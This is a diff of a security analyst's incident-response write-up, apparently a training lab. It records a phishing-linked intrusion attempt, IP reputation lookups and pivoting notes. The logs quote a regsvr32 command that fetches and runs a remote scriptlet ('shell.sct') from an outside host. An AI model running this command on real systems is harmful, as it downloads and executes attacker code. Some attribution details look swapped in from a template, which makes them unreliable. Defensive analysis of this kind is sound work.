@@ -52,13 +52,13 @@ Step-by-step walkthrough of the analysis:
        - Feb 04 2025 08:06:42 - Source IP: `84.38.130.118`
        - Feb 04 2025 08:06:08 - `"C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"`
    - A matching DNS query was submitted linking to the source IP: `projectmanagement@pm.me`.
-   - VirusTotal flagged the IP as malicious (10/91 vendors), associated with China Unicom Global.
+   - VirusTotal flagged the IP as malicious (10/91 vendors), associated with SIA RixHost.
 
 - Any pivoting done:
-  - I searched log management for 203.160.68.12 across all other internal hosts; no additional targets found, indicating this was a single-target attempt.
-  - I checked whether the **/clients/MyCRL** path or **/etc/passwd** traversal attempt showed up against any other Check Point gateway or endpoint in the environment, but found nothing.
-  - I found out the source IP address belongs to China Unicom (Hong Kong) Operations Limited and originates from Hong Kong.
-  - I found the Source IP is registered to a Network Named **UNICOM-HK**
+  - I searched log management for 84.38.130.118 across all other internal hosts; no additional targets found, indicating this was a single-target attempt.
+  - I checked whether **projectmanagement@pm.me** sent or delivered the same email and attachment to other endpoints in the environment, but found nothing.
+  - I found out the source IP address belongs to SAR195-RIPE and originates from Europe.
+  - I found the Source IP is registered to a Network Named **DATACLUB-LV**
 
 <br>
     
